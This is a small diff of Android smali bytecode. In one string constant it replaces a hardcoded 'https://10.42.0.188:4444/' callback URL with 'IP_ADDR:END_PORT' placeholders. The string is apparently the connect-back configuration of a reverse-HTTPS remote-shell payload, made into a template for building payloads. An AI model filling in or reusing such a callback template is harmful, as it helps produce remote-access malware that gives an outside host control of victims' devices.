@@ -236,7 +236,7 @@
     .end local v14    # "retryWait":J
     .end local v16    # "timeouts":[Ljava/lang/String;
     :cond_1
-    const-string v18, "ZZZZhttps://10.42.0.188:4444/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcwgLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
+    const-string v18, "ZZZZhttps://IP_ADDR:END_PORT/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcwgLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
 
     const/16 v19, 0x4
 
